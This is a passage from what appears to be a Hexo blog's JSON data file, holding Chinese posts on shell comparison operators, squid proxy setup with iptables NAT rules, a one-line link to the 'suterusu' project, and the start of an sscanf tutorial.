字符串、数字比较\ncategories: [Shell编程]\ntags: []\ndate: 2011-04-22 20:30:00\n---\n二元比较操作符,比较变量或者比较数字.注意数字与字符串的区别.&nbsp;<br />整数比较&nbsp;<br />-eq &nbsp; &nbsp; &nbsp; 等于,如:if [ &quot;$a&quot; -eq &quot;$b&quot; ]&nbsp;-ne &nbsp; &nbsp; &nbsp; 不等于,如:if [ &quot;$a&quot; -ne &quot;$b&quot; ]&nbsp;-gt &nbsp; &nbsp; &nbsp; 大于,如:if [ &quot;$a&quot; -gt &quot;$b&quot; ]&nbsp;-ge &nbsp; &nbsp; &nbsp; 大于等于,如:if [ &quot;$a&quot; -ge &quot;$b&quot; ]&nbsp;-lt &nbsp; &nbsp; &nbsp; 小于,如:if [ &quot;$a&quot; -lt &quot;$b&quot; ]&nbsp;-le &nbsp; &nbsp; &nbsp; 小于等于,如:if [ &quot;$a&quot; -le &quot;$b&quot; ]&nbsp;&lt; &nbsp; &nbsp; &nbsp; 小于(需要双括号),如:((&quot;$a&quot; &lt; &quot;$b&quot;))&nbsp;&lt;= &nbsp; &nbsp; &nbsp; 小于等于(需要双括号),如:((&quot;$a&quot; &lt;= &quot;$b&quot;))&nbsp;&gt; &nbsp; &nbsp; &nbsp; 大于(需要双括号),如:((&quot;$a&quot; &gt; &quot;$b&quot;))&nbsp;&gt;= &nbsp; &nbsp; &nbsp; 大于等于(需要双括号),如:((&quot;$a&quot; &gt;= &quot;$b&quot;))&nbsp;<br />字符串比较&nbsp;= &nbsp; &nbsp; &nbsp; 等于,如:if [ &quot;$a&quot; = &quot;$b&quot; ]&nbsp;== &nbsp; &nbsp; &nbsp; 等于,如:if [ &quot;$a&quot; == &quot;$b&quot; ],与=等价&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 注意:==的功能在[[]]和[]中的行为是不同的,如下:&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 1 [[ $a == z* ]] &nbsp; &nbsp;# 如果$a以&quot;z&quot;开头(模式匹配)那么将为true&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 2 [[ $a == &quot;z*&quot; ]] # 如果$a等于z*(字符匹配),那么结果为true&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 3&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 4 [ $a == z* ] &nbsp; &nbsp; &nbsp;# File globbing 和word splitting将会发生&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 5 [ &quot;$a&quot; == &quot;z*&quot; ] # 如果$a等于z*(字符匹配),那么结果为true&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 一点解释,关于File globbing是一种关于文件的速记法,比如&quot;*.c&quot;就是,再如~也是.&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 但是file globbing并不是严格的正则表达式,虽然绝大多数情况下结构比较像.&nbsp;!= &nbsp; &nbsp; &nbsp; 不等于,如:if [ &quot;$a&quot; != &quot;$b&quot; ]&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 这个操作符将在[[]]结构中使用模式匹配.&nbsp;&lt; &nbsp; &nbsp; &nbsp; 小于,在ASCII字母顺序下.如:&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; if [[ &quot;$a&quot; &lt; &quot;$b&quot; ]]&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; if [ &quot;$a&quot; &lt; &quot;$b&quot; ]&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 注意:在[]结构中&quot;&lt;&quot;需要被转义.&nbsp;&gt; &nbsp; &nbsp; &nbsp; 大于,在ASCII字母顺序下.如:&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; if [[ &quot;$a&quot; &gt; &quot;$b&quot; ]]&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; if [ &quot;$a&quot; &gt; &quot;$b&quot; ]&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 注意:在[]结构中&quot;&gt;&quot;需要被转义.&nbsp;-z &nbsp; &nbsp; &nbsp; 字符串为&quot;null&quot;.就是长度为0.&nbsp;-n &nbsp; &nbsp; &nbsp; 字符串不为&quot;null&quot; <br />","slug":"shell-字符串、数字比较","published":1,"updated":"2023-04-22T05:38:44.906Z","_id":"clgrjlxj8006k7opi740mauk3","comments":1,"layout":"post","photos":[],"link":"","content":"<p>二元比较操作符,比较变量或者比较数字.注意数字与字符串的区别.&amp;nbsp;<br />整数比较&amp;nbsp;<br />-eq &amp;nbsp; &amp;nbsp; &amp;nbsp; 等于,如:if [ &quot;$a&quot; -eq &quot;$b&quot; ]&amp;nbsp;-ne &amp;nbsp; &amp;nbsp; &amp;nbsp; 不等于,如:if [ &quot;$a&quot; -ne &quot;$b&quot; ]&amp;nbsp;-gt &amp;nbsp; &amp;nbsp; &amp;nbsp; 大于,如:if [ &quot;$a&quot; -gt &quot;$b&quot; ]&amp;nbsp;-ge &amp;nbsp; &amp;nbsp; &amp;nbsp; 大于等于,如:if [ &quot;$a&quot; -ge &quot;$b&quot; ]&amp;nbsp;-lt &amp;nbsp; &amp;nbsp; &amp;nbsp; 小于,如:if [ &quot;$a&quot; -lt &quot;$b&quot; ]&amp;nbsp;-le &amp;nbsp; &amp;nbsp; &amp;nbsp; 小于等于,如:if [ &quot;$a&quot; -le &quot;$b&quot; ]&amp;nbsp;&lt; &amp;nbsp; &amp;nbsp; &amp;nbsp; 小于(需要双括号),如:((&quot;$a&quot; &lt; &quot;$b&quot;))&amp;nbsp;&lt;&#x3D; &amp;nbsp; &amp;nbsp; &amp;nbsp; 小于等于(需要双括号),如:((&quot;$a&quot; &lt;&#x3D; &quot;$b&quot;))&amp;nbsp;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; 大于(需要双括号),如:((&quot;$a&quot; &gt; &quot;$b&quot;))&amp;nbsp;&gt;&#x3D; &amp;nbsp; &amp;nbsp; &amp;nbsp; 大于等于(需要双括号),如:((&quot;$a&quot; &gt;&#x3D; &quot;$b&quot;))&amp;nbsp;<br />字符串比较&amp;nbsp;&#x3D; &amp;nbsp; &amp;nbsp; &amp;nbsp; 等于,如:if [ &quot;$a&quot; &#x3D; &quot;$b&quot; ]&amp;nbsp;&#x3D;&#x3D; &amp;nbsp; &amp;nbsp; &amp;nbsp; 等于,如:if [ &quot;$a&quot; &#x3D;&#x3D; &quot;$b&quot; ],与&#x3D;等价&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 注意:&#x3D;&#x3D;的功能在[[]]和[]中的行为是不同的,如下:&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 1 [[ $a &#x3D;&#x3D; z* ]] &amp;nbsp; &amp;nbsp;# 如果$a以&quot;z&quot;开头(模式匹配)那么将为true&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 2 [[ $a &#x3D;&#x3D; &quot;z*&quot; ]] # 如果$a等于z*(字符匹配),那么结果为true&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 3&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 4 [ $a &#x3D;&#x3D; z* ] &amp;nbsp; &amp;nbsp; &amp;nbsp;# File globbing 和word splitting将会发生&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 5 [ &quot;$a&quot; &#x3D;&#x3D; &quot;z*&quot; ] # 如果$a等于z*(字符匹配),那么结果为true&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 一点解释,关于File globbing是一种关于文件的速记法,比如&quot;*.c&quot;就是,再如~也是.&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 但是file globbing并不是严格的正则表达式,虽然绝大多数情况下结构比较像.&amp;nbsp;!&#x3D; &amp;nbsp; &amp;nbsp; &amp;nbsp; 不等于,如:if [ &quot;$a&quot; !&#x3D; &quot;$b&quot; ]&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 这个操作符将在[[]]结构中使用模式匹配.&amp;nbsp;&lt; &amp;nbsp; &amp;nbsp; &amp;nbsp; 小于,在ASCII字母顺序下.如:&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; if [[ &quot;$a&quot; &lt; &quot;$b&quot; ]]&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; if [ &quot;$a&quot; &lt; &quot;$b&quot; ]&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 注意:在[]结构中&quot;&lt;&quot;需要被转义.&amp;nbsp;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; 大于,在ASCII字母顺序下.如:&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; if [[ &quot;$a&quot; &gt; &quot;$b&quot; ]]&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; if [ &quot;$a&quot; &gt; &quot;$b&quot; ]&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 注意:在[]结构中&quot;&gt;&quot;需要被转义.&amp;nbsp;-z &amp;nbsp; &amp;nbsp; &amp;nbsp; 字符串为&quot;null&quot;.就是长度为0.&amp;nbsp;-n &amp;nbsp; &amp;nbsp; &amp;nbsp; 字符串不为&quot;null&quot; <br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p>二元比较操作符,比较变量或者比较数字.注意数字与字符串的区别.&amp;nbsp;<br />整数比较&amp;nbsp;<br />-eq &amp;nbsp; &amp;nbsp; &amp;nbsp; 等于,如:if [ &quot;$a&quot; -eq &quot;$b&quot; ]&amp;nbsp;-ne &amp;nbsp; &amp;nbsp; &amp;nbsp; 不等于,如:if [ &quot;$a&quot; -ne &quot;$b&quot; ]&amp;nbsp;-gt &amp;nbsp; &amp;nbsp; &amp;nbsp; 大于,如:if [ &quot;$a&quot; -gt &quot;$b&quot; ]&amp;nbsp;-ge &amp;nbsp; &amp;nbsp; &amp;nbsp; 大于等于,如:if [ &quot;$a&quot; -ge &quot;$b&quot; ]&amp;nbsp;-lt &amp;nbsp; &amp;nbsp; &amp;nbsp; 小于,如:if [ &quot;$a&quot; -lt &quot;$b&quot; ]&amp;nbsp;-le &amp;nbsp; &amp;nbsp; &amp;nbsp; 小于等于,如:if [ &quot;$a&quot; -le &quot;$b&quot; ]&amp;nbsp;&lt; &amp;nbsp; &amp;nbsp; &amp;nbsp; 小于(需要双括号),如:((&quot;$a&quot; &lt; &quot;$b&quot;))&amp;nbsp;&lt;&#x3D; &amp;nbsp; &amp;nbsp; &amp;nbsp; 小于等于(需要双括号),如:((&quot;$a&quot; &lt;&#x3D; &quot;$b&quot;))&amp;nbsp;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; 大于(需要双括号),如:((&quot;$a&quot; &gt; &quot;$b&quot;))&amp;nbsp;&gt;&#x3D; &amp;nbsp; &amp;nbsp; &amp;nbsp; 大于等于(需要双括号),如:((&quot;$a&quot; &gt;&#x3D; &quot;$b&quot;))&amp;nbsp;<br />字符串比较&amp;nbsp;&#x3D; &amp;nbsp; &amp;nbsp; &amp;nbsp; 等于,如:if [ &quot;$a&quot; &#x3D; &quot;$b&quot; ]&amp;nbsp;&#x3D;&#x3D; &amp;nbsp; &amp;nbsp; &amp;nbsp; 等于,如:if [ &quot;$a&quot; &#x3D;&#x3D; &quot;$b&quot; ],与&#x3D;等价&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 注意:&#x3D;&#x3D;的功能在[[]]和[]中的行为是不同的,如下:&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 1 [[ $a &#x3D;&#x3D; z* ]] &amp;nbsp; &amp;nbsp;# 如果$a以&quot;z&quot;开头(模式匹配)那么将为true&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 2 [[ $a &#x3D;&#x3D; &quot;z*&quot; ]] # 如果$a等于z*(字符匹配),那么结果为true&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 3&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 4 [ $a &#x3D;&#x3D; z* ] &amp;nbsp; &amp;nbsp; &amp;nbsp;# File globbing 和word splitting将会发生&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 5 [ &quot;$a&quot; &#x3D;&#x3D; &quot;z*&quot; ] # 如果$a等于z*(字符匹配),那么结果为true&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 一点解释,关于File globbing是一种关于文件的速记法,比如&quot;*.c&quot;就是,再如~也是.&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 但是file globbing并不是严格的正则表达式,虽然绝大多数情况下结构比较像.&amp;nbsp;!&#x3D; &amp;nbsp; &amp;nbsp; &amp;nbsp; 不等于,如:if [ &quot;$a&quot; !&#x3D; &quot;$b&quot; ]&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 这个操作符将在[[]]结构中使用模式匹配.&amp;nbsp;&lt; &amp;nbsp; &amp;nbsp; &amp;nbsp; 小于,在ASCII字母顺序下.如:&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; if [[ &quot;$a&quot; &lt; &quot;$b&quot; ]]&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; if [ &quot;$a&quot; &lt; &quot;$b&quot; ]&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 注意:在[]结构中&quot;&lt;&quot;需要被转义.&amp;nbsp;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; 大于,在ASCII字母顺序下.如:&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; if [[ &quot;$a&quot; &gt; &quot;$b&quot; ]]&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; if [ &quot;$a&quot; &gt; &quot;$b&quot; ]&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 注意:在[]结构中&quot;&gt;&quot;需要被转义.&amp;nbsp;-z &amp;nbsp; &amp;nbsp; &amp;nbsp; 字符串为&quot;null&quot;.就是长度为0.&amp;nbsp;-n &amp;nbsp; &amp;nbsp; &amp;nbsp; 字符串不为&quot;null&quot; <br /></p>\n"},{"title":"squid 三种代理方式","date":"2011-09-01T09:44:00.000Z","_content":"<p>Squid是一种在Linux系统下使用的优秀的代理服务器软件，很多时候都用到它。代理性能也很棒。</p><p>官方：<a href=\"http://www.squid-cache.org\">www.squid-cache.org</a></p><p>开始吧：</p><p>by:key1088</p><p>squid代理分为三种</p><p>1.传统代理</p><p>2.透明代理</p><p>3.反向代理（web加速）</p><p>&nbsp;</p><p>下面一一简单讲解，也便于自己以后记忆,网上很多教程都是过时的，建议还是去官方看看权威的。</p><p>&nbsp;</p><p>squid在那？官方下载。</p><p>我用的是squid-3.0.STABLE25</p><p>tar xvf squid-3.0.STABLE25.tar.gz</p><p>cd squid-3.0.STABLE25</p><p>./configure --prefix=/usr/local/squid&nbsp; --enable-linux-tproxy --enable-linux-netfilter --localstatedit=/cache</p><p>make</p><p>make install</p><p>1.传统代理</p><p>客户端浏览器 修改代理端口</p><p>http_port 3128&nbsp;&nbsp; </p><p>2.透明代理</p><p>要使用透明代理，编译的时候必须添加--enable-linux-tproxy --enable-linux-netfilter</p><p>图：<br />&nbsp;&nbsp; 192.168.2.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 192.168.20.0<br />clent -----&gt;eth0-[linux]-eth1-------</p><p>透明代理就是用防火墙把访问80的数据重定向到squid代理端口上面</p><p>iptables 端口转发只能在nat上面设置</p><p>所以我们要使用SNAT</p><p>客户端设置：</p><p>网关：squid服务器的ip</p><p>DNS:正常DNS</p><p>服务器：</p><p>首先开启透明模式</p><p>http_port 3128 transparent</p><p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p><p>用iptables开启NAT转换，现在客户端就能上网了。</p><p>iptables -t nat -A POSTROUTING -s 192.168.2.0/24 -o eth1 -j SNAT --to 192.168.20.128</p><p>端口转发80--&gt;3128</p><p>iptables -t nat -A PREROUTING -s 192.168.2.0/24 -p tcp --dport 80 -j REDIRECT --to-ports 3128</p><p>3.反向代理(web加速)</p><p>用squid 为web服务器（&nbsp;apache nginx lighttpd）提供加速</p><p>写主要的配置</p><p>一个站点的时候：</p><p>cache_peer 127.0.0.1 patent 80 0 no-query originserver<br />http_port 192.168.2.1:80&nbsp; accel defaultsite=192.168.2.1 </p><p>&nbsp;</p><p>apache：</p><p>listen 127.0.0.1:80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #这样和192.168.2.1:80不冲突</p><p>如果是其他的web server。监听127.0.0.1就可以</p><p>同服务器多个站点</p><p>Virtual Host :</p><p>acl our_sites dstdomain&nbsp;<a href=\"http://www.shoujizt.com/\">www.shoujizt.com</a> wap.shoujizt.com</p><p>cache_peer_access myAccel allow our_sites<br />cache_peer_access myAccel deny all<br />cache_peer 127.0.0.1 parent 80 0 no-query originserver name=myAccel login=PASS</p><p>http_port 192.168.2.1:80 accel vhost</p><p>更多的反向代理配置详细请看</p><p><a href=\"http://wiki.squid-cache.org/ConfigExamples\">http://wiki.squid-cache.org/ConfigExamples</a>&nbsp; Reverse Proxy (Acceleration)</p><p>以上就是三种代理方式，只是把主要用到的东西写上去，大体框架就是这些。</p><p>上面配置都是写上去的，难免有错误。如有什么错误，及改正请给予留言。</p><p>&nbsp;</p>","source":"_posts/squid-三种代理方式.md","raw":"title: squid 三种代理方式\ncategories: [Linux]\ntags: []\ndate: 2011-09-01 17:44:00\n---\n<p>Squid是一种在Linux系统下使用的优秀的代理服务器软件，很多时候都用到它。代理性能也很棒。</p><p>官方：<a href=\"http://www.squid-cache.org\">www.squid-cache.org</a></p><p>开始吧：</p><p>by:key1088</p><p>squid代理分为三种</p><p>1.传统代理</p><p>2.透明代理</p><p>3.反向代理（web加速）</p><p>&nbsp;</p><p>下面一一简单讲解，也便于自己以后记忆,网上很多教程都是过时的，建议还是去官方看看权威的。</p><p>&nbsp;</p><p>squid在那？官方下载。</p><p>我用的是squid-3.0.STABLE25</p><p>tar xvf squid-3.0.STABLE25.tar.gz</p><p>cd squid-3.0.STABLE25</p><p>./configure --prefix=/usr/local/squid&nbsp; --enable-linux-tproxy --enable-linux-netfilter --localstatedit=/cache</p><p>make</p><p>make install</p><p>1.传统代理</p><p>客户端浏览器 修改代理端口</p><p>http_port 3128&nbsp;&nbsp; </p><p>2.透明代理</p><p>要使用透明代理，编译的时候必须添加--enable-linux-tproxy --enable-linux-netfilter</p><p>图：<br />&nbsp;&nbsp; 192.168.2.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 192.168.20.0<br />clent -----&gt;eth0-[linux]-eth1-------</p><p>透明代理就是用防火墙把访问80的数据重定向到squid代理端口上面</p><p>iptables 端口转发只能在nat上面设置</p><p>所以我们要使用SNAT</p><p>客户端设置：</p><p>网关：squid服务器的ip</p><p>DNS:正常DNS</p><p>服务器：</p><p>首先开启透明模式</p><p>http_port 3128 transparent</p><p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p><p>用iptables开启NAT转换，现在客户端就能上网了。</p><p>iptables -t nat -A POSTROUTING -s 192.168.2.0/24 -o eth1 -j SNAT --to 192.168.20.128</p><p>端口转发80--&gt;3128</p><p>iptables -t nat -A PREROUTING -s 192.168.2.0/24 -p tcp --dport 80 -j REDIRECT --to-ports 3128</p><p>3.反向代理(web加速)</p><p>用squid 为web服务器（&nbsp;apache nginx lighttpd）提供加速</p><p>写主要的配置</p><p>一个站点的时候：</p><p>cache_peer 127.0.0.1 patent 80 0 no-query originserver<br />http_port 192.168.2.1:80&nbsp; accel defaultsite=192.168.2.1 </p><p>&nbsp;</p><p>apache：</p><p>listen 127.0.0.1:80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #这样和192.168.2.1:80不冲突</p><p>如果是其他的web server。监听127.0.0.1就可以</p><p>同服务器多个站点</p><p>Virtual Host :</p><p>acl our_sites dstdomain&nbsp;<a href=\"http://www.shoujizt.com/\">www.shoujizt.com</a> wap.shoujizt.com</p><p>cache_peer_access myAccel allow our_sites<br />cache_peer_access myAccel deny all<br />cache_peer 127.0.0.1 parent 80 0 no-query originserver name=myAccel login=PASS</p><p>http_port 192.168.2.1:80 accel vhost</p><p>更多的反向代理配置详细请看</p><p><a href=\"http://wiki.squid-cache.org/ConfigExamples\">http://wiki.squid-cache.org/ConfigExamples</a>&nbsp; Reverse Proxy (Acceleration)</p><p>以上就是三种代理方式，只是把主要用到的东西写上去，大体框架就是这些。</p><p>上面配置都是写上去的，难免有错误。如有什么错误，及改正请给予留言。</p><p>&nbsp;</p>","slug":"squid-三种代理方式","published":1,"updated":"2023-04-22T05:38:44.909Z","_id":"clgrjlxja006n7opifp88c3ef","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Squid是一种在Linux系统下使用的优秀的代理服务器软件，很多时候都用到它。代理性能也很棒。</p><p>官方：<a href=\"http://www.squid-cache.org\">www.squid-cache.org</a></p><p>开始吧：</p><p>by:key1088</p><p>squid代理分为三种</p><p>1.传统代理</p><p>2.透明代理</p><p>3.反向代理（web加速）</p><p>&nbsp;</p><p>下面一一简单讲解，也便于自己以后记忆,网上很多教程都是过时的，建议还是去官方看看权威的。</p><p>&nbsp;</p><p>squid在那？官方下载。</p><p>我用的是squid-3.0.STABLE25</p><p>tar xvf squid-3.0.STABLE25.tar.gz</p><p>cd squid-3.0.STABLE25</p><p>./configure --prefix=/usr/local/squid&nbsp; --enable-linux-tproxy --enable-linux-netfilter --localstatedit=/cache</p><p>make</p><p>make install</p><p>1.传统代理</p><p>客户端浏览器 修改代理端口</p><p>http_port 3128&nbsp;&nbsp; </p><p>2.透明代理</p><p>要使用透明代理，编译的时候必须添加--enable-linux-tproxy --enable-linux-netfilter</p><p>图：<br />&nbsp;&nbsp; 192.168.2.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 192.168.20.0<br />clent -----&gt;eth0-[linux]-eth1-------</p><p>透明代理就是用防火墙把访问80的数据重定向到squid代理端口上面</p><p>iptables 端口转发只能在nat上面设置</p><p>所以我们要使用SNAT</p><p>客户端设置：</p><p>网关：squid服务器的ip</p><p>DNS:正常DNS</p><p>服务器：</p><p>首先开启透明模式</p><p>http_port 3128 transparent</p><p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p><p>用iptables开启NAT转换，现在客户端就能上网了。</p><p>iptables -t nat -A POSTROUTING -s 192.168.2.0/24 -o eth1 -j SNAT --to 192.168.20.128</p><p>端口转发80--&gt;3128</p><p>iptables -t nat -A PREROUTING -s 192.168.2.0/24 -p tcp --dport 80 -j REDIRECT --to-ports 3128</p><p>3.反向代理(web加速)</p><p>用squid 为web服务器（&nbsp;apache nginx lighttpd）提供加速</p><p>写主要的配置</p><p>一个站点的时候：</p><p>cache_peer 127.0.0.1 patent 80 0 no-query originserver<br />http_port 192.168.2.1:80&nbsp; accel defaultsite=192.168.2.1 </p><p>&nbsp;</p><p>apache：</p><p>listen 127.0.0.1:80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #这样和192.168.2.1:80不冲突</p><p>如果是其他的web server。监听127.0.0.1就可以</p><p>同服务器多个站点</p><p>Virtual Host :</p><p>acl our_sites dstdomain&nbsp;<a href=\"http://www.shoujizt.com/\">www.shoujizt.com</a> wap.shoujizt.com</p><p>cache_peer_access myAccel allow our_sites<br />cache_peer_access myAccel deny all<br />cache_peer 127.0.0.1 parent 80 0 no-query originserver name=myAccel login=PASS</p><p>http_port 192.168.2.1:80 accel vhost</p><p>更多的反向代理配置详细请看</p><p><a href=\"http://wiki.squid-cache.org/ConfigExamples\">http://wiki.squid-cache.org/ConfigExamples</a>&nbsp; Reverse Proxy (Acceleration)</p><p>以上就是三种代理方式，只是把主要用到的东西写上去，大体框架就是这些。</p><p>上面配置都是写上去的，难免有错误。如有什么错误，及改正请给予留言。</p><p>&nbsp;</p>","site":{"data":{}},"excerpt":"","more":"<p>Squid是一种在Linux系统下使用的优秀的代理服务器软件，很多时候都用到它。代理性能也很棒。</p><p>官方：<a href=\"http://www.squid-cache.org\">www.squid-cache.org</a></p><p>开始吧：</p><p>by:key1088</p><p>squid代理分为三种</p><p>1.传统代理</p><p>2.透明代理</p><p>3.反向代理（web加速）</p><p>&nbsp;</p><p>下面一一简单讲解，也便于自己以后记忆,网上很多教程都是过时的，建议还是去官方看看权威的。</p><p>&nbsp;</p><p>squid在那？官方下载。</p><p>我用的是squid-3.0.STABLE25</p><p>tar xvf squid-3.0.STABLE25.tar.gz</p><p>cd squid-3.0.STABLE25</p><p>./configure --prefix=/usr/local/squid&nbsp; --enable-linux-tproxy --enable-linux-netfilter --localstatedit=/cache</p><p>make</p><p>make install</p><p>1.传统代理</p><p>客户端浏览器 修改代理端口</p><p>http_port 3128&nbsp;&nbsp; </p><p>2.透明代理</p><p>要使用透明代理，编译的时候必须添加--enable-linux-tproxy --enable-linux-netfilter</p><p>图：<br />&nbsp;&nbsp; 192.168.2.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 192.168.20.0<br />clent -----&gt;eth0-[linux]-eth1-------</p><p>透明代理就是用防火墙把访问80的数据重定向到squid代理端口上面</p><p>iptables 端口转发只能在nat上面设置</p><p>所以我们要使用SNAT</p><p>客户端设置：</p><p>网关：squid服务器的ip</p><p>DNS:正常DNS</p><p>服务器：</p><p>首先开启透明模式</p><p>http_port 3128 transparent</p><p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p><p>用iptables开启NAT转换，现在客户端就能上网了。</p><p>iptables -t nat -A POSTROUTING -s 192.168.2.0/24 -o eth1 -j SNAT --to 192.168.20.128</p><p>端口转发80--&gt;3128</p><p>iptables -t nat -A PREROUTING -s 192.168.2.0/24 -p tcp --dport 80 -j REDIRECT --to-ports 3128</p><p>3.反向代理(web加速)</p><p>用squid 为web服务器（&nbsp;apache nginx lighttpd）提供加速</p><p>写主要的配置</p><p>一个站点的时候：</p><p>cache_peer 127.0.0.1 patent 80 0 no-query originserver<br />http_port 192.168.2.1:80&nbsp; accel defaultsite=192.168.2.1 </p><p>&nbsp;</p><p>apache：</p><p>listen 127.0.0.1:80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #这样和192.168.2.1:80不冲突</p><p>如果是其他的web server。监听127.0.0.1就可以</p><p>同服务器多个站点</p><p>Virtual Host :</p><p>acl our_sites dstdomain&nbsp;<a href=\"http://www.shoujizt.com/\">www.shoujizt.com</a> wap.shoujizt.com</p><p>cache_peer_access myAccel allow our_sites<br />cache_peer_access myAccel deny all<br />cache_peer 127.0.0.1 parent 80 0 no-query originserver name=myAccel login=PASS</p><p>http_port 192.168.2.1:80 accel vhost</p><p>更多的反向代理配置详细请看</p><p><a href=\"http://wiki.squid-cache.org/ConfigExamples\">http://wiki.squid-cache.org/ConfigExamples</a>&nbsp; Reverse Proxy (Acceleration)</p><p>以上就是三种代理方式，只是把主要用到的东西写上去，大体框架就是这些。</p><p>上面配置都是写上去的，难免有错误。如有什么错误，及改正请给予留言。</p><p>&nbsp;</p>"},{"title":"suterusu项目代码","date":"2013-04-13T04:52:51.000Z","_content":"suterusu项目代码，很值得研究\nhttp://redmine.poppopret.org/projects/suterusu/repository","source":"_posts/suterusu项目代码.md","raw":"title: suterusu项目代码\ncategories: [网络安全]\ntags: []\ndate: 2013-04-13 12:52:51\n---\nsuterusu项目代码，很值得研究\nhttp://redmine.poppopret.org/projects/suterusu/repository","slug":"suterusu项目代码","published":1,"updated":"2023-04-22T05:38:44.916Z","_id":"clgrjlxja006o7opi61z4dg41","comments":1,"layout":"post","photos":[],"link":"","content":"<p>suterusu项目代码，很值得研究<br><a href=\"http://redmine.poppopret.org/projects/suterusu/repository\">http://redmine.poppopret.org/projects/suterusu/repository</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>suterusu项目代码，很值得研究<br><a href=\"http://redmine.poppopret.org/projects/suterusu/repository\">http://redmine.poppopret.org/projects/suterusu/repository</a></p>\n"},{"title":"sscanf函数的用法","date":"2014-03-16T07:05:21.000Z","_content":"sscanf() - 从一个字符串中读进与指定格式相符的数据.\n函数原型:\nint sscanf( string str, string fmt, mixed var1, mixed var2 ... );\nint scanf( const char *format [,argument]... );\n说明：\n　　sscanf与scanf类似，都是用于输入的，只是后者以屏幕(stdin)为输入源，前者以固定字符串为输入源。\n　　其中的format可以是一个或多个 {%[*] [width] [{h | l | I64 | L}]type | ' ' | '/t' | '/n' | 